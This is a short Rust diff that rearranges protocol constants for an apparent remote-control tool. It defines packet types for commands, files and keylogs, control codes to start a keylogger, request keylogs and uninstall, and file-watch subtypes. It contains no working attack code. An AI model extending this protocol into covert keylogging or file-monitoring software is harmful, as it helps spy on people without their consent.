@@ -11,8 +11,7 @@ pub const PACKET_TYPE_CMD_RESP: u8 = 5;
 pub const PACKET_TYPE_FILE: u8 = 6;
 pub const PACKET_TYPE_KEYLOG: u8 = 7;
 pub const PACKET_TYPE_CTRL: u8 = 8;
-// File watch packet types (use subtype field)
-pub const PACKET_TYPE_FILE_WATCH: u8 = 9;
+pub const PACKET_TYPE_FILE_WATCH: u8 = 9;  // ADD THIS
 
 // Control subtypes for PACKET_TYPE_CTRL
 pub const CTRL_START_KEYLOGGER: u8 = 1;
@@ -21,10 +20,10 @@ pub const CTRL_REQUEST_KEYLOG: u8 = 3;
 pub const CTRL_UNINSTALL: u8 = 4;
 
 // File watch subtypes for PACKET_TYPE_FILE_WATCH
-pub const FILE_WATCH_INIT: u8 = 1;      // Initial file content
-pub const FILE_WATCH_UPDATE: u8 = 2;    // File changed
-pub const FILE_WATCH_DELETE: u8 = 3;    // File deleted
-pub const FILE_WATCH_STOP: u8 = 4;      // Stop watching
+pub const FILE_WATCH_INIT: u8 = 1;
+pub const FILE_WATCH_UPDATE: u8 = 2;
+pub const FILE_WATCH_DELETE: u8 = 3;
+pub const FILE_WATCH_STOP: u8 = 4;
 
 // Fixed 32-byte header in UDP payload
 pub const HEADER_SIZE: usize = 32;
